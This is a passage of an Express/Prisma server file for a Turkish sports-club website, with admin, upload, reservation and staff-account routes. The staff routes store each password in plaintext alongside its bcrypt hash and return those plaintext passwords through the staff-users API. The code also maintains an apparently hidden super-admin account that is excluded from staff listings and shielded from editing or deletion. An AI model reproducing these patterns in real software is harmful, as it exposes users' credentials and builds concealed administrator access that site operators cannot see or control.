      const parsed = parseSiteBackupPayload(JSON.parse(fs.readFileSync(filePath, 'utf8')));
      data = parsed.data;
    } else if (payload) {
      const parsed = parseSiteBackupPayload(payload);
      data = parsed.data;
    } else {
      return res.status(400).json({ message: 'Yedek verisi gönderilmedi' });
    }

    const settings = await restoreSiteBackupData(data);
    res.json({ ok: true, settings, backups: listStoredSiteBackups() });
  } catch (error) {
    console.error('Site backup restore failed:', error);
    res.status(400).json({ message: error.message || 'Yedek yüklenemedi' });
  }
});

app.get('/api/public', async (_, res) => {
  const [services, packages, gallery, announcements, trainers, posts] = await Promise.all([
    prisma.service.findMany({ orderBy: { createdAt: 'asc' } }),
    prisma.package.findMany({ orderBy: { price: 'asc' } }),
    prisma.galleryItem.findMany({ orderBy: { createdAt: 'asc' } }),
    prisma.announcement.findMany({ orderBy: { createdAt: 'desc' } }),
    prisma.trainer.findMany({ orderBy: { createdAt: 'asc' } }),
    prisma.blogPost.findMany({ where: { published: true }, orderBy: { createdAt: 'desc' } })
  ]);
  res.json({ services, packages, gallery, announcements, trainers, posts });
});

app.get('/api/admin/dashboard', staffRequired, async (req, res) => {
  const [users, reservations, revenue, activeMembers] = await Promise.all([
    prisma.user.count(),
    prisma.reservation.count(),
    prisma.package.aggregate({ _sum: { price: true } }),
    prisma.user.count({ where: { role: 'USER' } })
  ]);
  const payload = {
    stats: {
      totalUsers: users,
      activeMembers,
      revenue: revenue._sum.price || 0,
      reservations
    },
    recentReservations: await prisma.reservation.findMany({
      orderBy: { createdAt: 'desc' },
      take: 5
    })
  };

  if (isAdminRole(req.user.role)) {
    payload.recentUsers = await prisma.user.findMany({
      orderBy: { createdAt: 'desc' },
      take: 5,
      select: { id: true, name: true, email: true, role: true, createdAt: true }
    });
  }

  res.json(payload);
});

app.get('/api/admin/:resource', staffRequired, async (req, res) => {
  const map = {
    services: prisma.service,
    packages: prisma.package,
    gallery: prisma.galleryItem,
    announcements: prisma.announcement,
    trainers: prisma.trainer,
    posts: prisma.blogPost,
    reservations: prisma.reservation,
    media: prisma.media,
    settings: prisma.setting
  };
  const resource = map[req.params.resource];
  if (!resource) return res.status(404).json({ message: 'Bulunamadı' });
  const data = await resource.findMany({ orderBy: { createdAt: 'desc' } });
  res.json({ data });
});

app.post('/api/admin/upload', staffRequired, upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ message: 'Dosya seçilmedi' });
  }

  let filename = req.file.filename;
  try {
    if (isRasterUpload(req.file)) {
      filename = await normalizeUploadedImage(req.file);
    }
  } catch (error) {
    console.error('Image normalize failed:', error);
  }

  registerUploadedFile(filename, {
    title: req.file.originalname,
    type: isRasterUpload(req.file) ? 'image/jpeg' : req.file.mimetype
  });

  try {
    const settings = await readAllSettingsMap().catch(() => readSettingsBackup());
    scheduleAutoSiteBackup(settings);
  } catch {
    // ignore backup scheduling errors
  }

  res.json({
    id: crypto.randomUUID(),
    title: req.file.originalname,
    url: `/uploads/${filename}`,
    type: isRasterUpload(req.file) ? 'image/jpeg' : req.file.mimetype
  });
});

app.delete('/api/admin/uploads/:filename', staffRequired, async (req, res) => {
  try {
    const removed = removeUploadedFile(req.params.filename);
    if (!removed) return res.status(400).json({ message: 'Dosya silinemedi' });
    res.json({ ok: true });
  } catch (error) {
    console.error('Upload delete failed:', error);
    res.status(500).json({ message: 'Dosya silinemedi' });
  }
});

app.put('/api/admin/settings/:key', staffRequired, async (req, res) => {
  const { key } = req.params;
  const { value } = req.body;
  try {
    const setting = await persistSettingValue(key, value);
    return res.json(setting);
  } catch (error) {
    console.error('Settings save failed:', error);
    const backup = readSettingsBackup();
    backup[key] = value;
    writeSettingsBackup(backup);
    return res.json({ key, value, backup: true });
  }
});

app.post('/api/reservations', async (req, res) => {
  const { name, phone, service, date, note } = req.body;
  const reservation = await prisma.reservation.create({
    data: { name, phone, service, date: new Date(date), note }
  });
  res.json({ reservation });
});

app.post('/api/messages', async (req, res) => {
  const { name, email, content } = req.body;
  const message = await prisma.message.create({ data: { name, email, content } });
  res.json({ message });
});

const staffUserSelect = {
  id: true,
  name: true,
  email: true,
  username: true,
  passwordPlain: true,
  role: true,
  createdAt: true,
  updatedAt: true
};

app.get('/api/admin/staff-users', adminOnlyRequired, async (_, res) => {
  try {
    if (!dbReady) {
      return res.status(503).json({ message: 'Veritabanı hazırlanıyor, birkaç saniye sonra tekrar deneyin.' });
    }
    const hiddenEmail = getHiddenSuperAdmin().email;
    const users = await prisma.user.findMany({
      where: {
        role: { in: ['ADMIN', 'MODERATOR'] },
        email: { not: hiddenEmail }
      },
      orderBy: { createdAt: 'desc' },
      select: staffUserSelect
    });
    res.json({ data: users });
  } catch (error) {
    console.error('staff-users list failed:', error);
    res.status(500).json({ message: 'Kullanıcı listesi alınamadı' });
  }
});

app.post('/api/admin/staff-users', adminOnlyRequired, async (req, res) => {
  try {
    if (!dbReady) {
      return res.status(503).json({ message: 'Veritabanı hazırlanıyor, birkaç saniye sonra tekrar deneyin.' });
    }
    if (!canManageStaffUsers(req.user.role)) {
      return res.status(403).json({ message: 'Yetersiz yetki' });
    }
    const { name, email, username, password, role } = req.body || {};
    const normalizedEmail = (email || '').trim().toLowerCase();
    const normalizedUsername = (username || '').trim().toLowerCase() || null;

    if (isHiddenSuperAdminEmail(normalizedEmail)) {
      return res.status(400).json({ message: 'Bu e-posta kullanılamaz' });
    }
    if (!name || !normalizedEmail || !password) {
      return res.status(400).json({ message: 'Ad, e-posta ve şifre zorunludur' });
    }
    if (password.length < 6) {
      return res.status(400).json({ message: 'Şifre en az 6 karakter olmalı' });
    }

    const staffRole = role === 'MODERATOR' ? 'MODERATOR' : 'ADMIN';
    const passwordHash = await bcrypt.hash(password, 10);

    const user = await prisma.user.create({
      data: {
        name: String(name).trim(),
        email: normalizedEmail,
        username: normalizedUsername,
        passwordHash,
        passwordPlain: password,
        role: staffRole
      },
      select: staffUserSelect
    });
    await syncStaffUsersToFile();
    res.json({ user });
  } catch (error) {
    console.error('staff-users create failed:', error);
    if (error.code === 'P2002') {
      return res.status(400).json({ message: 'E-posta veya kullanıcı adı zaten kayıtlı' });
    }
    return res.status(500).json({ message: 'Kullanıcı oluşturulamadı. Veritabanı şeması güncelleniyor olabilir, birkaç saniye sonra tekrar deneyin.' });
  }
});

app.patch('/api/admin/staff-users/:id', adminOnlyRequired, async (req, res) => {
  try {
    if (!dbReady) {
      return res.status(503).json({ message: 'Veritabanı hazırlanıyor, birkaç saniye sonra tekrar deneyin.' });
    }
    const { name, email, username, password, role } = req.body || {};
    const existing = await prisma.user.findUnique({ where: { id: req.params.id } });
    if (!existing || !isStaffRole(existing.role)) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
    }
    if (isHiddenSuperAdminEmail(existing.email)) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
    }
    if (email && isHiddenSuperAdminEmail(String(email).trim().toLowerCase())) {
      return res.status(400).json({ message: 'Bu e-posta kullanılamaz' });
    }

    const data = {};
    if (name) data.name = String(name).trim();
    if (email) data.email = String(email).trim().toLowerCase();
    if (username !== undefined) data.username = username ? String(username).trim().toLowerCase() : null;
    if (password) {
      if (password.length < 6) {
        return res.status(400).json({ message: 'Şifre en az 6 karakter olmalı' });
      }
      data.passwordHash = await bcrypt.hash(password, 10);
      data.passwordPlain = password;
    }
    if (role === 'MODERATOR' || role === 'ADMIN') data.role = role;

    const user = await prisma.user.update({
      where: { id: req.params.id },
      data,
      select: staffUserSelect
    });
    await syncStaffUsersToFile();
    res.json({ user });
  } catch (error) {
    console.error('staff-users update failed:', error);
    if (error.code === 'P2002') {
      return res.status(400).json({ message: 'E-posta veya kullanıcı adı zaten kayıtlı' });
    }
    return res.status(500).json({ message: 'Kullanıcı güncellenemedi' });
  }
});

app.delete('/api/admin/staff-users/:id', adminOnlyRequired, async (req, res) => {
  try {
    if (!dbReady) {
      return res.status(503).json({ message: 'Veritabanı hazırlanıyor, birkaç saniye sonra tekrar deneyin.' });
    }
    const existing = await prisma.user.findUnique({ where: { id: req.params.id } });
    if (!existing || !isStaffRole(existing.role)) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
    }
    if (isHiddenSuperAdminEmail(existing.email)) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
    }
    if (req.user.id === existing.id) {
      return res.status(400).json({ message: 'Kendi hesabınızı silemezsiniz' });
    }
    await prisma.user.delete({ where: { id: req.params.id } });
    await syncStaffUsersToFile();
    res.json({ ok: true });
  } catch (error) {
    console.error('staff-users delete failed:', error);
    res.status(500).json({ message: 'Kullanıcı silinemedi' });
  }
});

app.patch('/api/auth/profile', staffRequired, async (req, res) => {
  const { name, email, username, currentPassword, newPassword } = req.body || {};

  if (req.user.id === HIDDEN_SUPER_ADMIN_ID) {
    return res.json({ user: createHiddenSuperAdminSession() });
  }

  const user = await prisma.user.findUnique({ where: { id: req.user.id } });
  if (!user || !isStaffRole(user.role)) {
    return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
  }

  if (newPassword) {
    if (!currentPassword || !(await bcrypt.compare(currentPassword, user.passwordHash))) {
      return res.status(400).json({ message: 'Mevcut şifre hatalı' });
    }
    if (newPassword.length < 6) {
      return res.status(400).json({ message: 'Yeni şifre en az 6 karakter olmalı' });
    }
  }

  if (email && isHiddenSuperAdminEmail(String(email).trim().toLowerCase())) {
    return res.status(400).json({ message: 'Bu e-posta kullanılamaz' });
  }

  const data = {};
  if (name) data.name = String(name).trim();
  if (email) data.email = String(email).trim().toLowerCase();
  if (username !== undefined) data.username = username ? String(username).trim().toLowerCase() : null;
  if (newPassword) {
    data.passwordHash = await bcrypt.hash(newPassword, 10);
    data.passwordPlain = newPassword;
  }

  try {
    const updated = await prisma.user.update({
      where: { id: user.id },
      data,
      select: staffUserSelect
    });
    const token = signToken(updated);
    res.cookie('token', token, authCookieOptions);
    res.json({ user: updated, token });
  } catch (error) {
    if (error.code === 'P2002') {
      return res.status(400).json({ message: 'E-posta veya kullanıcı adı zaten kayıtlı' });
    }
    throw error;
  }
});

app.use('/assets', express.static(path.join(rootDir, 'dist', 'assets'), {
  immutable: true,
  maxAge: '1y'
}));
app.use(express.static(path.join(rootDir, 'dist')));

function getSeoHeadInjection() {
  const token = (process.env.GOOGLE_SITE_VERIFICATION || '').trim();
  if (!token) return '';
  return `<meta name="google-site-verification" content="${token.replace(/"/g, '')}" />`;
}

function isStaticAssetPath(requestPath) {
  return (
    requestPath.startsWith('/assets/') ||
    /\.(js|mjs|css|map|png|jpe?g|webp|svg|ico|woff2?|txt|xml|webmanifest)$/i.test(requestPath)
  );
}

app.use((req, res) => {
  if (isStaticAssetPath(req.path)) {
    return res.status(404).type('text/plain').send('Not found');
  }

  const indexPath = path.join(rootDir, 'dist', 'index.html');
  if (fs.existsSync(indexPath)) {
    let html = fs.readFileSync(indexPath, 'utf8');
    const injection = getSeoHeadInjection();
    if (injection) {
      html = html.replace('<!-- PEAKSPOR_SEO_INJECTION -->', injection);
    }
    return res.type('html').send(html);
  }
  res.status(404).json({ message: 'Build bulunamadı' });
});

async function bootstrapDatabase() {
  try {
    await connectDatabase();
  } catch (error) {
    console.error('Database connect failed:', error.message || error);
    return;
  }

  await pushDatabaseSchema(isRailway ? 90000 : 45000);

  try {
    await syncPersistentStoreOnBoot();
    await ensureSeedData();
    await syncPersistentStoreOnBoot();
    dbReady = true;
    console.log('Database seeded successfully');
  } catch (error) {
    console.error('Database seed failed:', error.message || error);
    try {
      await pushDatabaseSchema(60000);
      await syncPersistentStoreOnBoot();
      await ensureSeedData();
      await syncPersistentStoreOnBoot();
      dbReady = true;
      console.log('Database seeded successfully after schema retry');
    } catch (retryError) {
      console.error('Database seed retry failed:', retryError.message || retryError);
    }
  }
}

async function start() {
  console.log(`PEAKSPOR booting on port ${port}...`);
  app.listen(port, '0.0.0.0', () => {
    const dbHint = process.env.DATABASE_URL
      ? `${process.env.DATABASE_URL.split(':')[0]}://***`
      : 'not set';
    console.log(`PEAKSPOR server listening on ${port} (0.0.0.0)`);
    console.log(`Environment: ${isProduction ? 'production' : 'development'}, DATABASE_URL: ${dbHint}`);
    void bootstrapDatabase();
  });
}

start().catch(error => {
  console.error(error);
  process.exit(1);
});